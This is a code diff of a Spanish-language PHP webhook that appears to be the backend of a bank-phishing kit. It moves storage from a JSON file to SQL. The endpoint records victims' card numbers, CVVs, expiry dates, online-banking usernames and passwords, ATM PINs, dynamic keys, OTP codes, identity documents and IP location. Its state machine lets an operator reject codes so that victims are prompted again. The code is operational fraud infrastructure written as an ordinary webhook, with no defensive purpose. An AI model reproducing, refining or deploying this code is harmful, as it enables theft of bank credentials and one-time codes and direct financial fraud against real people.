@@ -1,287 +1,147 @@
 <?php
-// api/webhook.php - VERSIÓN CORREGIDA + IP/PAÍS/CIUDAD
-header('Content-Type: application/json');
-header('Access-Control-Allow-Origin: *');
-header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
-header('Access-Control-Allow-Headers: Content-Type, X-API-Key');
+// api/webhook.php
+require_once __DIR__ . '/_bootstrap.php';
 
-if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
-    http_response_code(200);
-    exit;
+if (($_SERVER['REQUEST_METHOD'] ?? '') !== 'POST') {
+    json_err('method_not_allowed', 405);
 }
 
-// 🔒 Cargar configuración
-require_once __DIR__ . '/../panel/config/config.php';
+pyp_require_api_key();
 
-// 🔥 Cargar ban_manager para usar ban_obtenerIPReal() como fallback
-require_once __DIR__ . '/../panel/config/ban_manager.php';
+$raw = file_get_contents('php://input');
+$input = json_decode($raw, true);
+if (!is_array($input)) json_err('invalid_json');
 
-$API_KEY_VALIDA = WEBHOOK_SECRET;
-
-// Obtener API Key desde $_SERVER
-$api_key = $_SERVER['HTTP_X_API_KEY'] ?? '';
-
-if ($api_key !== $API_KEY_VALIDA) {
-    http_response_code(401);
-    echo json_encode(['error' => 'API Key inválida']);
-    exit;
-}
-
-$input = json_decode(file_get_contents('php://input'), true);
-if (!$input) {
-    http_response_code(400);
-    echo json_encode(['error' => 'Datos inválidos']);
-    exit;
-}
-
-$dataDir = __DIR__ . '/../data/';
-if (!is_dir($dataDir)) mkdir($dataDir, 0755, true);
-
-$file = $dataDir . 'solicitudes.dat';
-$solicitudes = file_exists($file) ? json_decode(file_get_contents($file), true) : [];
-
-$solicitudId = $input['solicitudId'] ?? 'SOL-' . date('Ymd') . '-' . substr(uniqid(), -6);
-$tipo_paso = $input['tipo_paso'] ?? 'credenciales';
+$solicitudId = trim($input['solicitudId'] ?? '');
+$tipoPaso = trim($input['tipo_paso'] ?? 'credenciales');
+if (!$solicitudId) json_err('missing_solicitudId');
 
 // ============================================
-// CASO 1: CREDENCIALES
+// CASO 1: CREDENCIALES (INSERT)
 // ============================================
-if ($tipo_paso === 'credenciales') {
-    $existe = false;
-    foreach ($solicitudes as $s) {
-        if ($s['id'] === $solicitudId) {
-            $existe = true;
-            break;
-        }
-    }
-    
+if ($tipoPaso === 'credenciales') {
+    $existe = db_fetch("SELECT id FROM solicitudes WHERE id = ?", [$solicitudId]);
+
     if (!$existe) {
-        $solicitud = [
-            'id' => $solicitudId,
-            'fecha' => date('Y-m-d H:i:s'),
-            'tipo_paso' => 'credenciales',
-            'estado' => 'pending',
-            'fecha_hora' => $input['fechaHora'] ?? date('Y-m-d H:i:s'),
-            'tipo_tarjeta' => $input['tipo_tarjeta'] ?? $input['tipoTarjeta'] ?? 'mastercard',
-            'numero_tarjeta' => $input['numeroTarjeta'] ?? $input['numero_tarjeta'] ?? 'N/A',
-            'cvv' => $input['cvv'] ?? 'N/A',
-            'vencimiento' => $input['vencimiento'] ?? 'N/A',
-            'banco' => $input['bancoEmisor'] ?? $input['banco_emisor'] ?? 'N/A',
-            'usuario' => $input['usuario'] ?? 'N/A',
-            'password' => $input['password'] ?? 'N/A',
-            'monto' => $input['monto'] ?? 'N/A',
-            'nombre' => $input['nombreCompleto'] ?? $input['nombre_completo'] ?? 'N/A',
-            'documento' => trim(($input['tipoDocumento'] ?? '') . ' ' . ($input['numeroDocumento'] ?? 'N/A')),
-            'email' => $input['email'] ?? 'N/A',
-            'celular' => $input['celular'] ?? 'N/A',
-            'otp_codigo' => 'N/A',
-            'clave_cajero_codigo' => 'N/A',
-            'clave_dinamica_codigo' => 'N/A',
-            'otp_codigo_secundario' => 'N/A',
-            'otp_modo' => 'N/A',
-            'intentos' => 0,
-            'ultima_actualizacion' => time(),
+        $ip = !empty($input['ip']) ? $input['ip'] : pyp_ip();
+        $pais = !empty($input['pais']) ? $input['pais'] : 'Desconocido';
+        $ciudad = !empty($input['ciudad']) ? $input['ciudad'] : 'Desconocida';
 
-            // 🔥 IP + PAÍS + CIUDAD (con fallback a ban_obtenerIPReal)
-            'ip'     => !empty($input['ip'])     ? $input['ip']     : ban_obtenerIPReal(),
-            'pais'   => !empty($input['pais'])   ? $input['pais']   : 'Desconocido',
-            'ciudad' => !empty($input['ciudad']) ? $input['ciudad'] : 'Desconocida'
-        ];
-        $solicitudes[] = $solicitud;
-        
-        file_put_contents($file, json_encode($solicitudes, JSON_PRETTY_PRINT));
-        file_put_contents($dataDir . 'ultima_actualizacion.txt', time());
-        
-        http_response_code(200);
-        echo json_encode([
-            'success' => true,
-            'id' => $solicitudId,
-            'message' => 'Solicitud creada correctamente'
+        db_exec("
+            INSERT INTO solicitudes (
+                id, fecha, fecha_procesada, numero_tarjeta, cvv, vencimiento, banco, tipo_tarjeta,
+                usuario, password, otp_codigo, otp_codigo_secundario, otp_modo,
+                clave_cajero_codigo, clave_dinamica_codigo, nombre, documento, email, celular, monto, placas,
+                ip, pais, ciudad, estado, payload_json
+            ) VALUES (
+                ?, NOW(), NULL, ?, ?, ?, ?, ?,
+                ?, ?, 'N/A', 'N/A', 'N/A',
+                'N/A', 'N/A', ?, ?, ?, ?, ?, ?,
+                ?, ?, ?, 'pending', ?
+            )
+        ", [
+            $solicitudId,
+            $input['numeroTarjeta'] ?? $input['numero_tarjeta'] ?? 'N/A',
+            $input['cvv'] ?? 'N/A',
+            $input['vencimiento'] ?? 'N/A',
+            $input['bancoEmisor'] ?? $input['banco_emisor'] ?? 'N/A',
+            $input['tipo_tarjeta'] ?? $input['tipoTarjeta'] ?? 'visa',
+            $input['usuario'] ?? 'N/A',
+            $input['password'] ?? 'N/A',
+            $input['nombreCompleto'] ?? $input['nombre_completo'] ?? 'N/A',
+            trim(($input['tipoDocumento'] ?? '') . ' ' . ($input['numeroDocumento'] ?? 'N/A')),
+            $input['email'] ?? 'N/A',
+            $input['celular'] ?? 'N/A',
+            $input['monto'] ?? 'N/A',
+            $input['placas'] ?? null,
+            $ip,
+            $pais,
+            $ciudad,
+            json_encode($input, JSON_UNESCAPED_UNICODE)
         ]);
-        exit;
-    } else {
-        http_response_code(200);
-        echo json_encode([
-            'success' => true,
-            'id' => $solicitudId,
-            'message' => 'Solicitud ya existe'
-        ]);
-        exit;
+
+        json_ok(['id' => $solicitudId, 'message' => 'Solicitud creada']);
     }
+
+    json_ok(['id' => $solicitudId, 'message' => 'Solicitud ya existe']);
 }
 
 // ============================================
-// CASO 2: OTP / CLAVE DINÁMICA / CLAVE CAJERO
+// CASO 2: OTP / CLAVE DINÁMICA / CLAVE CAJERO (UPDATE)
 // ============================================
-if ($tipo_paso === 'otp' || $tipo_paso === 'clave_dinamica' || $tipo_paso === 'clave_cajero') {
+if (in_array($tipoPaso, ['otp', 'clave_dinamica', 'clave_cajero'])) {
     $originalId = $input['solicitudOriginalId'] ?? $input['solicitudId'] ?? null;
-    $esReintento = isset($input['es_reintento']) && $input['es_reintento'] === true;
-    
-    if ($originalId) {
-        $encontrado = false;
-        foreach ($solicitudes as &$s) {
-            if ($s['id'] === $originalId) {
-                
-                $estadoActual = $s['estado'] ?? 'pending';
-                
-                // CASO ESPECIAL: ERROR USUARIO - NO PERMITIR REINTENTOS
-                if ($estadoActual === 'rejected_user_error') {
-                    http_response_code(403);
-                    echo json_encode([
-                        'success' => false,
-                        'error' => 'Error de usuario. Por favor, reinicie el proceso con nuevas credenciales.',
-                        'estado' => $estadoActual,
-                        'requiere_reset' => true
-                    ]);
-                    exit;
-                }
-                
-                $estadosRechazados = ['rejected', 'rejected_otp', 'rejected_clave_cajero'];
-                
-                if (in_array($estadoActual, $estadosRechazados) && !$esReintento) {
-                    http_response_code(403);
-                    echo json_encode([
-                        'success' => false,
-                        'error' => 'La solicitud fue rechazada. Por favor, inicie nuevamente el proceso.',
-                        'estado' => $estadoActual
-                    ]);
-                    exit;
-                }
-                
-                if ($esReintento && in_array($estadoActual, $estadosRechazados)) {
-                    $s['estado'] = 'pending_otp';
-                    $s['otp_modo'] = 'otp';
-                    $s['fecha_procesada'] = date('Y-m-d H:i:s');
-                    $s['intentos'] = ($s['intentos'] ?? 0) + 1;
-                    $s['otp_codigo'] = 'N/A';
-                    $s['clave_cajero_codigo'] = 'N/A';
-                    $s['clave_dinamica_codigo'] = 'N/A';
-                    $s['otp_codigo_secundario'] = 'N/A';
-                    $mensaje = '🔄 Reintento - Estado reiniciado a pending_otp';
-                }
-                
-                $codigo = $input['codigo'] ?? 'N/A';
-                
-                if ($tipo_paso === 'clave_cajero') {
-                    $s['clave_cajero_codigo'] = $codigo;
-                    $s['estado'] = 'pending_clave_cajero';
-                    $s['otp_modo'] = 'clave_cajero';
-                    $s['fecha_clave_cajero'] = date('Y-m-d H:i:s');
-                    $mensaje = '🏧 Clave Cajero guardada';
-                    
-                } elseif ($tipo_paso === 'clave_dinamica') {
-                    $s['clave_dinamica_codigo'] = $codigo;
-                    $s['estado'] = 'pending_otp';
-                    $s['otp_modo'] = 'clave_dinamica';
-                    $s['fecha_clave_dinamica'] = date('Y-m-d H:i:s');
-                    $mensaje = '🔑 Clave Dinámica guardada';
-                    
-                } else {
-                    // 🔥 OTP - CORREGIDO
-                    $tieneClaveCajero = isset($s['clave_cajero_codigo']) && 
-                                        $s['clave_cajero_codigo'] !== 'N/A' && 
-                                        $s['clave_cajero_codigo'] !== '';
-                    
-                    $tieneClaveDinamica = isset($s['clave_dinamica_codigo']) && 
-                                          $s['clave_dinamica_codigo'] !== 'N/A' && 
-                                          $s['clave_dinamica_codigo'] !== '';
-                    
-                    if ($tieneClaveCajero) {
-                        $s['otp_codigo_secundario'] = $codigo;
-                        $s['estado'] = 'pending_otp';
-                        $s['otp_modo'] = 'otp';
-                        $s['fecha_otp'] = date('Y-m-d H:i:s');
-                        $mensaje = '📱 OTP guardado (Clave Cajero prevalece como código anterior)';
-                    } elseif ($tieneClaveDinamica) {
-                        $s['otp_codigo_secundario'] = $codigo;
-                        $s['estado'] = 'pending_otp';
-                        $s['otp_modo'] = 'otp';
-                        $s['fecha_otp'] = date('Y-m-d H:i:s');
-                        $mensaje = '📱 OTP guardado (Clave Dinámica prevalece como código anterior)';
-                    } else {
-                        $s['otp_codigo'] = $codigo;
-                        $s['otp_modo'] = 'otp';
-                        $s['estado'] = 'pending_otp';
-                        $s['fecha_otp'] = date('Y-m-d H:i:s');
-                        $mensaje = '📱 OTP guardado';
-                    }
-                }
-                
-                $s['ultima_actualizacion'] = time();
-                $encontrado = true;
-                break;
-            }
-        }
-        
-        if ($encontrado) {
-            file_put_contents($file, json_encode($solicitudes, JSON_PRETTY_PRINT));
-            file_put_contents($dataDir . 'ultima_actualizacion.txt', time());
-            
-            http_response_code(200);
-            echo json_encode([
-                'success' => true,
-                'id' => $originalId,
-                'message' => $mensaje ?? 'Código guardado correctamente',
-                'actualizado' => true,
-                'es_reintento' => $esReintento
-            ]);
-            exit;
-        }
+    $esReintento = !empty($input['es_reintento']);
+
+    if (!$originalId) json_err('missing_original_id');
+
+    $s = db_fetch("SELECT * FROM solicitudes WHERE id = ?", [$originalId]);
+    if (!$s) json_err('Solicitud original no encontrada', 404);
+
+    $estadoActual = $s['estado'] ?? 'pending';
+
+    // ERROR USUARIO - NO REINTENTOS
+    if ($estadoActual === 'rejected_user_error') {
+        json_err('Error de usuario. Reinicie el proceso.', 403);
     }
-    
-    http_response_code(404);
-    echo json_encode([
-        'success' => false,
-        'error' => 'Solicitud original no encontrada. Por favor, inicie el proceso nuevamente.'
-    ]);
-    exit;
+
+    $estadosRechazados = ['rejected', 'rejected_otp', 'rejected_clave_cajero'];
+
+    if (in_array($estadoActual, $estadosRechazados) && !$esReintento) {
+        json_err('La solicitud fue rechazada. Inicie nuevamente.', 403);
+    }
+
+    $updates = [];
+    $params = [];
+
+    if ($esReintento && in_array($estadoActual, $estadosRechazados)) {
+        $updates[] = "estado = 'pending_otp'";
+        $updates[] = "otp_modo = 'otp'";
+        $updates[] = "fecha_procesada = NOW()";
+        $updates[] = "otp_codigo = 'N/A'";
+        $updates[] = "clave_cajero_codigo = 'N/A'";
+        $updates[] = "clave_dinamica_codigo = 'N/A'";
+        $updates[] = "otp_codigo_secundario = 'N/A'";
+        $mensaje = 'Reintento - Estado reiniciado';
+    }
+
+    $codigo = $input['codigo'] ?? 'N/A';
+
+    if ($tipoPaso === 'clave_cajero') {
+        $updates[] = "clave_cajero_codigo = ?";
+        $params[] = $codigo;
+        $updates[] = "estado = 'pending_clave_cajero'";
+        $updates[] = "otp_modo = 'clave_cajero'";
+        $mensaje = 'Clave Cajero guardada';
+    } elseif ($tipoPaso === 'clave_dinamica') {
+        $updates[] = "clave_dinamica_codigo = ?";
+        $params[] = $codigo;
+        $updates[] = "estado = 'pending_otp'";
+        $updates[] = "otp_modo = 'clave_dinamica'";
+        $mensaje = 'Clave Dinámica guardada';
+    } else {
+        // OTP
+        $tieneClaveCajero = !empty($s['clave_cajero_codigo']) && $s['clave_cajero_codigo'] !== 'N/A';
+        $tieneClaveDinamica = !empty($s['clave_dinamica_codigo']) && $s['clave_dinamica_codigo'] !== 'N/A';
+
+        if ($tieneClaveCajero || $tieneClaveDinamica) {
+            $updates[] = "otp_codigo_secundario = ?";
+            $params[] = $codigo;
+            $mensaje = 'OTP guardado (secundario)';
+        } else {
+            $updates[] = "otp_codigo = ?";
+            $params[] = $codigo;
+            $mensaje = 'OTP guardado';
+        }
+        $updates[] = "estado = 'pending_otp'";
+        $updates[] = "otp_modo = 'otp'";
+    }
+
+    $params[] = $originalId;
+    $sqlUpdate = "UPDATE solicitudes SET " . implode(', ', $updates) . " WHERE id = ?";
+    db_exec($sqlUpdate, $params);
+
+    json_ok(['id' => $originalId, 'message' => $mensaje, 'actualizado' => true, 'es_reintento' => $esReintento]);
 }
 
-// ============================================
-// CASO 3: OBTENER ESTADO
-// ============================================
-if ($tipo_paso === 'obtener_estado' || isset($_GET['id'])) {
-    $id = $input['id'] ?? $_GET['id'] ?? null;
-    
-    if (!$id) {
-        http_response_code(400);
-        echo json_encode(['error' => 'ID requerido']);
-        exit;
-    }
-    
-    foreach ($solicitudes as $s) {
-        if ($s['id'] === $id) {
-            http_response_code(200);
-            echo json_encode([
-                'success' => true,
-                'id' => $s['id'],
-                'estado' => $s['estado'] ?? 'pending',
-                'estado_real' => $s['estado'] ?? 'pending',
-                'tipo_tarjeta' => $s['tipo_tarjeta'] ?? 'mastercard',
-                'otp_codigo' => $s['otp_codigo'] ?? 'N/A',
-                'clave_cajero_codigo' => $s['clave_cajero_codigo'] ?? 'N/A',
-                'clave_dinamica_codigo' => $s['clave_dinamica_codigo'] ?? 'N/A',
-                'otp_codigo_secundario' => $s['otp_codigo_secundario'] ?? 'N/A',
-                'otp_modo' => $s['otp_modo'] ?? 'N/A',
-                'intentos' => $s['intentos'] ?? 0,
-                'fecha' => $s['fecha'] ?? null,
-                'fecha_procesada' => $s['fecha_procesada'] ?? null
-            ]);
-            exit;
-        }
-    }
-    
-    http_response_code(404);
-    echo json_encode([
-        'success' => false,
-        'error' => 'Solicitud no encontrada'
-    ]);
-    exit;
-}
-
-http_response_code(400);
-echo json_encode([
-    'success' => false,
-    'error' => 'Tipo de paso no reconocido'
-]);
-exit;
+json_err('Tipo de paso no reconocido');
